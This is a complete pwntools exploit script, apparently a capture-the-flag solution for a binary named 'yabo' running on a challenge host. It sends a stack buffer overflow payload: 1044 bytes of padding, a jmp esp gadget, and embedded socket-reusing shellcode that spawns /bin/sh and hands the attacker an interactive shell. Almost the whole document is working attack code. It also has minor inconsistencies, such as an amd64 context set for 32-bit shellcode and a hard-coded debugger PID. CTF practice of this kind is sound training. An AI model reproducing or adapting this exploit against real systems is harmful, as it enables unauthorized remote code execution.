#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context.update(arch='amd64')
exe = './yabo'
HOST = 'challenge.ctf.games'
PORT = 32762
elf = ELF(exe)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.attach(23751, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return remote("127.0.0.1", 9999)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
b vuln
b *0x080493c3
set follow-fork-mode child
'''.format(**locals())

# http://shell-storm.org/shellcode/files/shellcode-881.php
# redirect stdin, stdout, stderr to currently open socket
buf =  b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += b"\x89\xe3\x31\xc9\xcd\x80"
p = start()
p.recvuntil(b"?")

pad_len = 1044
log.info(f"overflow index @ {pad_len} chars")

payload = b"A"*pad_len
payload += p32(0x080492e2) # jmp esp
payload += buf
payload += b"\x90"*64 # nop slep

log.info(f"sending {len(payload)} byte payload")

p.sendline(payload)
p.interactive()
